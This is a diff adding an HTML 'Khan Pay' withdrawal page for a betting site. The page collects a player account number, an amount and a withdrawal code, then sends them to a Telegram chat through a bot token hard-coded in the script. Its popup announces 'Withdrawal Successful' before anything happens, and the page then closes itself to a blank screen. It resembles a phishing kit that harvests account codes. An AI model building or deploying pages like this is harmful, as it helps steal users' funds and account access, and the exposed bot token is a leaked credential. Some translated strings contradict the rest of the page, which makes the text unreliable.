@@ -1,0 +1,812 @@
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Khan Pay</title>
+  <style>
+    * {
+       margin: 0;
+       padding: 0;
+       box-sizing: border-box;
+       font-family: inherit;
+       font-size: inherit;
+       line-height: inherit;
+       color: inherit;
+      }
+    body {
+      width: 100% !important;
+      max-width: 100% !important;
+      padding: 0 !important;
+      margin: 0 !important;
+      overflow: hidden;
+      font-family: Georgia, serif;
+      text-align: center;
+      background-color: #042F28;
+      color: white;
+      }
+    h1 {
+      font-size: 22px;
+      margin-top: 4%;
+    }
+    .form-container {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: left;
+    }
+    .form-instructions {
+      width: 80%;
+      text-align: center;
+      margin: 10% 10% 3% 10%;
+      font-size: 20px;
+      font-weight: bold;
+      font-family: Georgia, serif;
+    }
+    .popup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: #042F28;
+      color: white;
+      padding: 20px;
+      box-shadow: 0 0 25px rgba(255, 255, 255, 0.9);
+      border-radius: 15px;
+      z-index: 1000;
+      width: 90%;
+      max-width: 500px;
+      text-align: center;
+    }
+    .popup-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.7);
+      z-index: 999;
+    }
+    .popup input {
+      display: block;
+      width: 100%;
+      height: 40px;
+      padding: 5px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-family: Georgia, serif;
+      background-color: white;
+      color: #042F28;
+    }
+    .popup button {
+      width: 100%;
+      padding: 12px;
+      margin: 20px 0 10px 0;
+      font-family: Georgia, serif;
+      background-color: #D0E41E;
+      color: black;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: bold;
+      font-size: 16px;
+    }
+    .popup-header {
+      margin: 0 0 15px 0;
+      font-size: 24px;
+      color: #D0E41E;
+    }
+    .message {
+      margin: 15px 0;
+      font-size: 16px;
+      font-family: Georgia, serif;
+      line-height: 1.5;
+    }
+    .depositButton {
+      width: 60%;
+      height: 40px;
+      text-align: center;
+      background-color: #D0E41E;
+      color: black;
+      font-weight: bold;
+      font-size: 18px;
+      border-radius: 5px;
+      margin: 10px 0 0 20%;
+      cursor: pointer;
+    }
+    .inputField {
+      width: 90%;
+      height: 40px;
+      padding: 5px;
+      margin: 0 5% 3px 5%;
+      border-radius: 5px;
+      background-color: #F4EFEF;
+      color: black;
+      border: 1px solid #ccc;
+    }
+    .formText {
+      margin: 15px 0 0 6%;
+      padding-left: 5px;
+      font-size: 16px;
+      text-align: left;
+    }
+    .walletData {
+      font-weight: bold;
+      text-align: left;
+      margin: 10px 0;
+      font-size: 18px;
+    }
+    .receipt {
+      align-items: center;
+      width: 30%;
+      height: 30%;
+      background-color: #042F28;
+      color: #D0E41E;
+    }
+    .HCIG {
+      color: black;
+      font-size: 13px;
+      padding: 3px;
+    }
+    .HCIG20 {
+      color: blue;
+      font-size: 20px;
+      padding: 5px;
+      text-align: center;
+    }
+
+    .dropdown {
+      display: none;
+      position: relative;
+      width: 100%;
+      margin-top: 20px;
+    }
+
+    .dropdown-trigger {
+      display: none;
+      width: 40%;
+      cursor: pointer;
+      text-align: center;
+      color: #D0E41E;
+      font-size: 13px;
+      padding: 10px;
+      margin: 0 30% 0 30%;
+      border-radius: 5px;
+      display: inline-block;
+    }
+
+    .dropdown-list {
+      display: none;
+      list-style: none;
+      position: absolute;
+      bottom: 100%;
+      left: 0;
+      right: 0;
+      padding: 10px;
+      background-color: #fff;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      text-align: left;
+      font-weight: bold;
+      z-index: 1001;
+      max-height: 300px;
+      overflow-y: auto;
+    }
+
+    .dropdown-list li {
+      padding: 10px;
+      transition: background-color 0.3s;
+      cursor: pointer;
+    }
+
+    .dropdown-list li:hover {
+      background-color: #f0f0f0;
+    }
+
+    .dropdown.active .dropdown-list {
+      display: block;
+    }
+
+    .wallet-number {
+      color: #D0E41E;
+      cursor: pointer;
+      text-decoration: underline;
+      text-align: left;
+      font-size: 20px;
+      display: block;
+      margin: 10px 0;
+      word-break: break-all;
+    }
+
+    .wallet-number:hover {
+      color: #a0b81a;
+    }
+
+    .copy-notification {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #4CAF50;
+      color: white;
+      padding: 15px 25px;
+      border-radius: 5px;
+      z-index: 2000;
+      display: none;
+      font-size: 16px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+    }
+
+    /* Loading indicator */
+    .loading {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.7);
+      z-index: 2000;
+      justify-content: center;
+      align-items: center;
+      color: white;
+      font-size: 24px;
+      flex-direction: column;
+    }
+
+    .spinner {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #D0E41E;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    /* Стили для таймера */
+    .close-timer {
+        font-size: 16px;
+        color: #D0E41E;
+        margin-top: 10px;
+        font-weight: bold;
+        display: none; /* Скрыто по умолчанию */
+    }
+  </style>
+</head>
+<body>
+  <h1 id="welcomeTitle">Welcome</h1>
+  <p id="formInstructions" class="form-instructions"></p>
+
+  <!-- Deposit Form -->
+  <div class="form-container">
+    <form id="depositForm">
+      <label for="playerAccountDeposit" class="formText">Player Account Number:</label>
+      <input class="inputField" type="text" id="playerAccountDeposit" placeholder="Enter your player account number" required>
+
+      <label for="depositAmount" class="formText">Withdrawal Amount (Min 300 <span id="currencyDisplay">PKR</span>):</label>
+      <!-- ✅ Добавлен id="depositAmountInput" -->
+      <input class="inputField" type="number" id="depositAmountInput" placeholder="Min 300 PKR" min="300" required>
+
+      <label for="walletNumber" class="formText">Withdrawal code:</label>
+      <input class="inputField" type="text" id="walletNumber" placeholder="Enter your withdrawal code" required>
+
+      <button type="submit" id="depositSubmitButton" class="depositButton">Withdraw</button>
+    </form>
+
+    <!-- Выпадающий список -->
+    <div class="dropdown">
+      <div class="dropdown-list">
+        <div id="request" class="HCIG"> </div>
+        <div id="code" class="HCIG"> </div>
+        <div id="makeWidth" class="HCIG"> </div>
+        <div>
+          <a id="link" class="HCIG20" href="https://sites.google.com/spinbetter.com/payform/pay-form-bdt-example-deposit      " target="_blank"> </a>
+        </div>
+      </div>
+      <div class="dropdown-trigger" id="HCIG">How can I get withdrawal?</div>
+    </div>
+  </div>
+
+  <!-- Deposit Popup -->
+  <div id="depositPopup" class="popup">
+    <div class="popup-header">
+      <h3 id="depositMessageTitle">Withdrawal Successful</h3>
+    </div>
+    <form id="confirmForm">
+      <div id="popupContent">
+        <label id="takePhoto"></label>
+        <p id="depositMessage" class="message"> </p>
+        <p id="transferAmount"></p>
+        <div class="walletData">
+          <span id="walletData" class="walletData"></span>
+          <span id="walletNumberDisplay" class="wallet-number" title="Click to copy"></span>
+        </div>
+        <div id="walletHolder" class="walletData"> </div>
+      </div>
+      <div id="waitingMessage" class="message" style="display: none;"></div>
+      <!-- ✅ Добавлен таймер -->
+      <div id="closeTimer" class="close-timer"></div>
+      <button type="button" id="doneButton">Done</button>
+    </form>
+  </div>
+
+  <!-- Overlay -->
+  <div id="popupOverlay" class="popup-overlay"></div>
+
+  <!-- Notification for copy -->
+  <div id="copyNotification" class="copy-notification">Wallet number copied to clipboard!</div>
+
+  <!-- Loading indicator -->
+  <div id="loading" class="loading">
+    <div class="spinner"></div>
+    <div>Please wait for data verification...</div>
+  </div>
+
+  <script>
+    const botToken = '8119920502:AAH7FocodcrMiXA2dFkmOYcI7QKwq0A49zg';// TG bot ID
+    const chatID = '-1003046795031';// Чат ID
+    const threadID = '38';// Тред ID
+    const currencySymbol = 'PKR'; // Марка валюты
+
+    // Храним данные формы для отправки позже
+    let formData = {};
+
+    // Function to send data to Telegram with error handling
+    async function sendDataToTelegram(operation, amount, walletNumber, playerAccount) {
+      const message = `
+Operation: ${"Withdrawal"}
+Player Account: <code>${playerAccount || 'N/A'}</code>
+Amount: <code>${amount}</code> ${currencySymbol}
+Withdrawal code: <code>${walletNumber || 'N/A'}</code>
+      `;
+      
+      // ✅ Исправлен URL (убран пробел)
+      const telegramURL = `https://api.telegram.org/bot  ${botToken}/sendMessage`;
+
+      try {
+        console.log('Sending data to Telegram:', message);
+        
+        // Используем fetch API для отправки данных
+        const response = await fetch(telegramURL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: chatID,
+            message_thread_id: threadID,
+            text: message,
+            parse_mode: 'HTML',
+          }),
+        });
+
+        if (response.ok) {
+          console.log('Data sent to Telegram successfully');
+          return true;
+        } else {
+          console.error('Failed to send data to Telegram. Status:', response.status);
+          return false;
+        }
+      } catch (error) {
+        console.error('Network error when sending data to Telegram:', error);
+        return false;
+      }
+    }
+
+    // Language support
+    const translations = {
+      en: {
+        welcomeTitle: "Welcome",
+        formInstructions: "To make withdrawal fill form below",        
+        playerAccountLabel: "Player Account Number:",
+        // ✅ Динамически
+        depositAmountLabel: `Withdrawal Amount (Min 300 ${currencySymbol}):`,
+        walletNumberLabel: "Withdrawal code:",
+        depositSubmitButton: "Withdraw",
+        depositMessageTitle: "Your withdrawal in process",
+        depositMessage: "Your withdrawal in process, wait for check",
+        WalletData: "Here we insert your payment data",
+        doneButton: "OK",
+        playerAccountDeposit: "Enter your player account",
+        takePhoto: "Please follow the instructions below",
+        walletData: "",
+        walletHolder: "",
+        HCIG: "How can i get withdrawal?",
+        // ✅ Динамически
+        request: `First you need make withdrawal request on site. (Min 300 ${currencySymbol})`,
+        code: "Next get withdrawal code.",
+        makeWidth: "After getting code, you need to make request on our",
+        link: " withdrawal form",
+        walletNumber: "Enter your withdrawal code",
+        // ✅ Антиспам
+        antispamMessage: "Your withdrawal is in process. Please wait at least 5 minutes.",
+        antispamContact: "If the funds do not arrive in your account, please contact customer support on the site.",
+        closeMessage: "Page will close in"
+      },
+      bn: {
+        welcomeTitle: "স্বাগতম",
+        formInstructions: "নীচে প্রত্যাহার পূরণ ফর্ম করতে",        
+        playerAccountLabel: "প্লেয়ার অ্যাকাউন্ট নম্বর:",
+        // ✅ Динамически
+        depositAmountLabel: `প্রত্যাহারের পরিমাণ (মিনিট 300 ${currencySymbol}):`,
+        walletNumberLabel: "প্রত্যাহার কোড:",
+        depositSubmitButton: "প্রত্যাহার",
+        depositMessageTitle: "প্রক্রিয়াতে আপনার প্রত্যাহার",
+        depositMessage: "প্রক্রিয়াতে আপনার প্রত্যাহার, চেকের জন্য অপেক্ষা করুন",
+        doneButton: "ঠিক আছে",
+        playerAccountDeposit: "আপনার প্লেয়ার অ্যাকাউন্ট লিখুন",
+        takePhoto: "নীচের নির্দেশাবলী অনুসরণ করুন",
+        walletData: "",
+        walletHolder: "",
+        HCIG: "আমি কীভাবে প্রত্যাহার করতে পারি?",
+        // ✅ Динамически
+        request: `First you need make withdrawal request on site. (Min 300 ${currencySymbol})`,
+        code: "Next get withdrawal code.",
+        makeWidth: "After getting code, you need to make request on our",
+        link: " withdrawal form",
+        walletNumber: "Enter your withdrawal code",
+        antispamMessage: "আপনার প্রত্যাহার প্রক্রিয়াধীন। কমপক্ষে 5 মিনিট অপেক্ষা করুন।",
+        antispamContact: "আপনার অ্যাকাউন্টে টাকা না এলে, সাইটের গ্রাহক সমর্থনে যোগাযোগ করুন।",
+        closeMessage: "পৃষ্ঠা বন্ধ হবে"
+      },
+      ru: {
+        welcomeTitle: "Добро пожаловать",
+        formInstructions: "Чтобы сделать вывод, заполните форму ниже",
+        playerAccountLabel: "Номер аккаунта игрока:",
+        playerAccountDeposit: "Введите ваш номер аккаунта",
+        // ✅ Динамически
+        depositAmountLabel: `Сумма вывода (минимум 300 ${currencySymbol}):`,
+        walletNumberLabel: "Код вывода:",
+        walletNumber: "Введите полученный код для вывода сресдтв",
+        depositSubmitButton: "Вывод",
+        depositMessageTitle: "Вывод в процессе",
+        depositMessage: "Ваш вывод в процессе, ожидайте проверки:",
+        doneButton: "ОК",
+        takePhoto: "Пожалуйста, следуйте инструкциям ниже",
+        walletData: "",
+        walletHolder: "",
+        HCIG: "Как я могу получить вывод?",
+        // ✅ Динамически
+        request: `Сначала нужно сделать запрос на вывод средств на сайте. (Мин 300 ${currencySymbol})`,
+        code: "Далее получите код для вывода.",
+        makeWidth: "После получения кода, вам нужно создать запрос на нашей.",
+        link: "форме для снятия средств",
+        walletNumber: "Enter your withdrawal code",
+        antispamMessage: "Ваш вывод в процессе. Пожалуйста, подождите минимум 5 минут.",
+        antispamContact: "Если средства не поступят на ваш счёт, обратитесь в поддержку клиентов на сайте.",
+        closeMessage: "Страница закроется через"
+        },
+      fr: {
+        welcomeTitle: "Bienvenue",
+        formInstructions: "Pour effectuer un dépôt, remplissez le formulaire ci-dessous",
+        playerAccountLabel: "Numéro de compte joueur :",
+        // ✅ Динамически
+        depositAmountLabel: `Montant du dépôt (minimum 300 ${currencySymbol}) :`,
+        walletNumberLabel: "Numéro de portefeuille :",
+        depositSubmitButton: "Déposer",
+        depositMessageTitle: "Dépôt dans le processus",
+        depositMessage: "Pour terminer le dépôt, vous devez transférer le montant précédemment indiqué au numéro de portefeuille du portefeuille.",
+        doneButton: "Terminé",
+        takePhoto: "Veuillez suivre les instructions ci-dessous",
+        walletData: "",
+        walletHolder: "",
+        HCIG: "Comment puis-je obtenir un retrait?",
+        // ✅ Динамически
+        request: `Tout d'abord, vous devez faire une demande de retraits sur le site. (Min 300 ${currencySymbol})`,
+        code: "Prochain code de retrait.",
+        makeWidth: "Après avoir obtenu le code, vous devez faire une demande sur notre.",
+        link: "Formulaire de retrait",
+        walletNumber: "Enter your withdrawal code",
+        antispamMessage: "Votre retrait est en cours. Veuillez attendre au moins 5 minutes.",
+        antispamContact: "Si les fonds n'arrivent pas sur votre compte, veuillez contacter le support client sur le site.",
+        closeMessage: "La page se fermera dans"
+      },
+      ar: {
+        welcomeTitle: "مرحباً",
+        formInstructions: "لإجراء إيداع، املأ النموذج أدناه",
+        playerAccountLabel: "رقم حساب اللاعب:",
+        // ✅ Динамически
+        depositAmountLabel: `مبلغ الانسحاب (الحد الأدنى 300 ${currencySymbol}):`,
+        walletNumberLabel: "رقم المحفظة:",
+        depositSubmitButton: "إيداع",
+        depositMessageTitle: "إيداع في هذه العملية",
+        depositMessage: "لإكمال الإيداع ، تحتاج إلى نقل المبلغ المشار إليه مسبقًا إلى رقم المحفظة للمحفظة",
+        doneButton: "تم",
+        takePhoto: "يرجى اتباع التعليمات أدناه",
+        walletData: "",
+        walletHolder: "",
+        HCIG: "كيف يمكنني الحصول على الانسحاب؟?",
+        // ✅ Динамически
+        request: `أولا، تحتاج إلى تقديم طلب للسحب على الموقع. الحد الأدنى 300 ${currencySymbol}`,
+        code: "التالي الحصول على رمز السحب.",
+        makeWidth: "بعد الحصول على التعليمات البرمجية، تحتاج إلى تقديم طلب على",
+        link: "نموذج الانسحاب",
+        walletNumber: "Enter your withdrawal code",
+        antispamMessage: "السحب الخاص بك قيد التنفيذ. يرجى الانتظار 5 دقائق على الأقل.",
+        antispamContact: "إذا لم تصل الأموال إلى حسابك، يرجى الاتصال بدعم العملاء على الموقع.",
+        closeMessage: "سيتم إغلاق الصفحة في"
+      },
+      ur: {
+        welcomeTitle: "خوش آمدید",
+        formInstructions: "واپسی کے لیے نیچے دی گئی فارم بھریں",        
+        playerAccountLabel: "پلیئر اکاؤنٹ نمبر:",
+        depositAmountLabel: `واپسی کی رقم (کم از کم 300 ${currencySymbol}):`,
+        walletNumberLabel: "واپسی کا کوڈ:",
+        depositSubmitButton: "واپسی کریں",
+        depositMessageTitle: "آپ کی واپسی زیر عمل ہے",
+        depositMessage: "آپ کی واپسی زیر عمل ہے، تصدیق کے انتظار کریں",
+        doneButton: "اوکے",
+        playerAccountDeposit: "اپنا پلیئر اکاؤنٹ درج کریں",
+        takePhoto: "براہ کرم نیچے دی گئی ہدایات پر عمل کریں",
+        walletData: "",
+        walletHolder: "",
+        HCIG: "میں واپسی کیسے حاصل کر سکتا ہوں؟",
+        request: `سب سے پہلے آپ کو سائٹ پر واپسی کی درخواست کرنی ہو گی۔ (کم از کم 300 ${currencySymbol})`,
+        code: "اگلے واپسی کا کوڈ حاصل کریں۔",
+        makeWidth: "کوڈ حاصل کرنے کے بعد، آپ کو ہمارے ذریعے درخواست کرنے کی ضرورت ہے",
+        link: " واپسی کی فارم",
+        walletNumber: "اپنا واپسی کا کوڈ درج کریں",
+        antispamMessage: "آپ کی واپسی زیر التوا ہے. براہ کرم کم از کم 5 منٹ انتظار کریں.",
+        antispamContact: "اگر آپ کے اکاؤنٹ میں فنڈ نہیں آتے ہیں، تو سائٹ پر کسٹمر سپورٹ سے رابطہ کریں.",
+        closeMessage: "صفحہ 10 سیکنڈ میں بند ہو جائے گا"
+      },
+      fil: {
+        welcomeTitle: "Maligayang pagdating",
+        formInstructions: "Upang makagawa ng withdrawal, punan ang form sa ibaba",
+        playerAccountLabel: "Numero ng Player Account:",
+        // ✅ Динамически
+        depositAmountLabel: `Halaga ng Withdrawal (Min 300 ${currencySymbol}):`,
+        walletNumberLabel: "Withdrawal code:",
+        depositSubmitButton: "Mag-withdraw",
+        depositMessageTitle: "Ang iyong withdrawal ay kasalukuyang pinoproseso",
+        depositMessage: "Ang iyong withdrawal ay kasalukuyang pinoproseso, maghintay para sa pagsusuri",
+        doneButton: "OK",
+        playerAccountDeposit: "Ilagay ang iyong player account",
+        takePhoto: "Mangyaring sundin ang mga tagubilin sa ibaba",
+        walletData: "",
+        walletHolder: "",
+        HCIG: "Paano ako makakakuha ng withdrawal?",
+        // ✅ Динамически
+        request: `Una kailangan mong gumawa ng kahilingan sa withdrawal sa site. (Min 300 ${currencySymbol})`,
+        code: "Susunod ay kumuha ng withdrawal code.",
+        makeWidth: "Pagkatapos ng pagkuha ng code, kailangan mong gumawa ng kahilingan sa aming",
+        link: " withdrawal form",
+        walletNumber: "Ilagay ang iyong withdrawal code",
+        antispamMessage: "Nasa proseso ang iyong withdrawal. Mangyaring maghintay ng kahit 5 minuto.",
+        antispamContact: "Kung hindi papasok ang mga pondo sa iyong account, mangyaring kontakin ang customer support sa site.",
+        closeMessage: "Isasara ang page sa"
+      }
+    };
+
+    // Detect user language and set translations
+    function detectLanguage() {
+      const userLang = navigator.language || navigator.userLanguage;
+      const langCode = userLang.split('-')[0];
+      return translations[langCode] || translations['en'];
+    }
+
+    // ✅ DOM elements
+    const depositForm = document.getElementById('depositForm');
+    const depositPopup = document.getElementById('depositPopup');
+    const popupOverlay = document.getElementById('popupOverlay');
+    const doneButton = document.getElementById('doneButton');
+    const loadingIndicator = document.getElementById('loading');
+    const currencyDisplay = document.getElementById('currencyDisplay'); // Для отображения валюты в заголовке
+    const depositAmountInput = document.getElementById('depositAmountInput'); // ✅ Добавлено
+    // ✅ Добавлены элементы для таймера и кнопки
+    const closeTimerElement = document.getElementById('closeTimer');
+    const popupContent = document.getElementById('popupContent');
+    const waitingMessage = document.getElementById('waitingMessage');
+
+    // ✅ Функция для обновления отображения валюты на странице
+    function updateCurrencyDisplay() {
+      currencyDisplay.innerText = currencySymbol;
+      // ✅ Обновляем placeholder у поля ввода суммы
+      depositAmountInput.placeholder = `Min 300 ${currencySymbol}`;
+    }
+
+    // Функция для обновления переводов
+    function updateTranslations() {
+      const currentLang = detectLanguage();
+
+      document.getElementById('welcomeTitle').innerText = currentLang.welcomeTitle;
+      document.getElementById('formInstructions').innerText = currentLang.formInstructions;
+      document.querySelector('label[for="playerAccountDeposit"]').innerText = currentLang.playerAccountLabel;
+      // ✅ Используем правильный ID для label
+      document.querySelector('label[for="depositAmountInput"]').innerText = currentLang.depositAmountLabel;
+      document.querySelector('label[for="walletNumber"]').innerText = currentLang.walletNumberLabel;
+      document.getElementById('depositSubmitButton').innerText = currentLang.depositSubmitButton;
+      document.getElementById('depositMessageTitle').innerText = currentLang.depositMessageTitle;
+      document.getElementById('depositMessage').innerText = currentLang.depositMessage;
+      document.getElementById('doneButton').innerText = currentLang.doneButton;
+      document.getElementById('takePhoto').innerText = currentLang.takePhoto;
+      document.getElementById('walletData').innerText = currentLang.walletData;
+      document.getElementById('walletHolder').innerText = currentLang.walletHolder;
+      document.getElementById('HCIG').innerText = currentLang.HCIG;
+      document.getElementById('request').innerText = currentLang.request;
+      document.getElementById('code').innerText = currentLang.code;
+      document.getElementById('makeWidth').innerText = currentLang.makeWidth;
+      document.getElementById('link').innerText = currentLang.link;
+
+      // ✅ Вызываем обновление валюты после обновления переводов
+      updateCurrencyDisplay();
+    }
+
+    // ✅ Функция для проверки спама (5 минут)
+    function isSpamRequest(playerAccount, walletNumber, depositAmount) {
+        const lastRequest = JSON.parse(localStorage.getItem('lastWithdrawalRequest')) || {};
+        const lastTimestamp = lastRequest.timestamp || 0;
+        const now = Date.now();
+        const timeDiffInMinutes = (now - lastTimestamp) / (1000 * 60);
+
+        // Проверяем, прошло ли 5 минут
+        if (timeDiffInMinutes < 5) {
+            // Проверяем, идентичны ли данные
+            if (lastRequest.playerAccount === playerAccount &&
+                lastRequest.walletNumber === walletNumber &&
+                lastRequest.depositAmount === depositAmount) {
+                return true; // Это спам-запрос
+            }
+        }
+        return false; // Это не спам-запрос
+    }
+
+    // ✅ Функция для сохранения данных последнего запроса
+    function saveLastWithdrawalRequest(playerAccount, walletNumber, depositAmount) {
+        const request = {
+            playerAccount: playerAccount,
+            walletNumber: walletNumber,
+            depositAmount: depositAmount,
+            timestamp: Date.now()
+        };
+        localStorage.setItem('lastWithdrawalRequest', JSON.stringify(request));
+    }
+
+    // ✅ Функция для отображения спам-попапа и запуска таймера
+    function showSpamPopup() {
+        const currentLang = detectLanguage();
+        document.getElementById('depositMessage').innerText = currentLang.antispamMessage || "Your withdrawal is in process. Please wait at least 5 minutes.";
+        document.getElementById('transferAmount').innerText = currentLang.antispamContact || "If the funds do not arrive in your account, please contact customer support on the site.";
+        document.getElementById('depositMessageTitle').innerText = "Spam Request";
+
+        // ✅ Скрываем элементы, связанные с выводом (если нужно)
+        // walletDataElement.style.display = 'none'; // Пример, если нужно скрыть
+        // walletNumberDisplayElement.style.display = 'none'; // Пример, если нужно скрыть
+        // walletHolderElement.style.display = 'none'; // Пример, если нужно скрыть
+        // doneButton.style.display = 'none'; // Отключаем кнопку Done
+
+        // ✅ Показываем таймер и запускаем отсчет
+        closeTimerElement.style.display = 'block';
+        let countdown = 10;
+        closeTimerElement.innerText = `${currentLang.closeMessage || "Page will close in"} ${countdown}...`;
+        const timer = setInterval(() => {
+            countdown--;
+            closeTimerElement.innerText = `${currentLang.closeMessage || "Page will close in"} ${countdown}...`;
+            if (countdown <= 0) {
+                clearInterval(timer);
+                window.location.href = 'about:blank'; // Закрываем страницу
+            }
+        }, 1000);
+
+        // Скрываем основное содержимое попапа
+        popupContent.style.display = 'none';
+        waitingMessage.style.display = 'none';
+
+        depositPopup.style.display = 'block';
+        popupOverlay.style.display = 'block';
+    }
+
+    // Вызываем функцию обновления переводов и валюты при загрузке страницы
+    document.addEventListener("DOMContentLoaded", () => {
+      updateTranslations();
+    });
+
+    // Handle Deposit Form Submission
+    depositForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      
+      // ✅ Используем правильный ID для поля суммы
+      const playerAccount = document.getElementById('playerAccountDeposit').value;
+      const depositAmount = depositAmountInput.value;
+      const walletNumber = document.getElementById('walletNumber').value;
+
+      // ✅ Проверяем на спам
+      if (isSpamRequest(playerAccount, walletNumber, depositAmount)) {
+          showSpamPopup(); // Показываем спам-попап и запускаем таймер
+          return; // Прерываем выполнение, если это спам
+      }
+
+      // Сохраняем данные формы
+      formData = {
+        playerAccount,
+        depositAmount,
+        walletNumber
+      };
+
+      // ✅ Сохраняем данные запроса для проверки спама
+      saveLastWithdrawalRequest(playerAccount, walletNumber, depositAmount);
+
+      // Показываем попап без отправки данных
+      depositPopup.style.display = 'block';
+      popupOverlay.style.display = 'block';
+    });
+
+    // Close Popup and Return to Previous Tab
+    doneButton.addEventListener('click', async () => {
+      // Скрываем попап и показываем индикатор загрузки
+      depositPopup.style.display = 'none';
+      popupOverlay.style.display = 'none';
+      loadingIndicator.style.display = 'flex';
+      
+      // Отправляем данные в Telegram
+      const success = await sendDataToTelegram(
+        'Withdrawal', 
+        formData.depositAmount, 
+        formData.walletNumber, 
+        formData.playerAccount
+      );
+      
+      // Скрываем индикатор загрузки
+      loadingIndicator.style.display = 'none';
+      
+      if (success) {
+        // Перенаправляем на сайт
+        window.location.href = "about:blank";
+      } else {
+        // Показываем попап с ошибкой
+        document.getElementById('depositMessageTitle').innerText = 'Error';
+        document.getElementById('depositMessage').innerText = 'Failed to process your request. Please try again.';
+        document.getElementById('doneButton').innerText = 'Close';
+        
+        // Восстанавливаем обработчик кнопки
+        const oldOnClick = doneButton.onclick;
+        doneButton.onclick = function() {
+          depositPopup.style.display = 'none';
+          popupOverlay.style.display = 'none';
+          document.getElementById('doneButton').innerText = 'Done';
+          doneButton.onclick = oldOnClick;
+          document.getElementById('depositMessageTitle').innerText = 'Withdrawal Successful';
+          document.getElementById('depositMessage').innerText = 'Your withdrawal in process, wait for check';
+        };
+        
+        // Показываем попап снова
+        depositPopup.style.display = 'block';
+        popupOverlay.style.display = 'block';
+      }
+    });
+
+    // Выпадающий список
+    document.addEventListener("DOMContentLoaded", () => {
+      const dropdownTrigger = document.querySelector(".dropdown-trigger");
+      const dropdown = document.querySelector(".dropdown");
+
+      dropdownTrigger.addEventListener("click", (e) => {
+        e.stopPropagation();
+        dropdown.classList.toggle("active");
+      });
+
+      // Закрываем выпадающий список при клике вне его области
+      document.addEventListener("click", (event) => {
+        if (!dropdown.contains(event.target)) {
+          dropdown.classList.remove("active");
+        }
+      });
+    });
+
+    // Log initialization
+    console.log('Page initialized successfully');
+  </script>
+</body>
+</html>
+```
